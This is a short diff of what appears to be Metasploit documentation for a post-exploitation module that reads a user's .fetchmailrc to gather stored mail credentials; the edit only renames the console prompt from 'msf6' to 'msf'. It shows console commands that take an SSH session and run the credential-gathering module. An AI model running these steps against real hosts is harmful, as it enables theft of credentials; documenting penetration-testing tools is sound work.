@@ -31,7 +31,7 @@ echo "poll example.com protocol pop3 username \"joesoap\" password \"XXX\"" > ~/
 ### Ubuntu 22.04.01
 
 ```
-msf6 auxiliary(scanner/ssh/ssh_login) > sessions -l
+msf auxiliary(scanner/ssh/ssh_login) > sessions -l
 
 Active sessions
 ===============
@@ -40,10 +40,10 @@ Active sessions
   --  ----  ----         -----------   ----------
   1         shell linux  SSH ubuntu @  2.2.2.2:39857 -> 1.1.1.1:22 (1.1.1.1)
 
-msf6 auxiliary(scanner/ssh/ssh_login) > use post/multi/gather/fetchmailrc_creds
-msf6 post(multi/gather/fetchmailrc_creds) > set session 1
+msf auxiliary(scanner/ssh/ssh_login) > use post/multi/gather/fetchmailrc_creds
+msf post(multi/gather/fetchmailrc_creds) > set session 1
 session => 1
-msf6 post(multi/gather/fetchmailrc_creds) > run
+msf post(multi/gather/fetchmailrc_creds) > run
 
 [*] Parsing /home/ubuntu/.fetchmailrc
                 
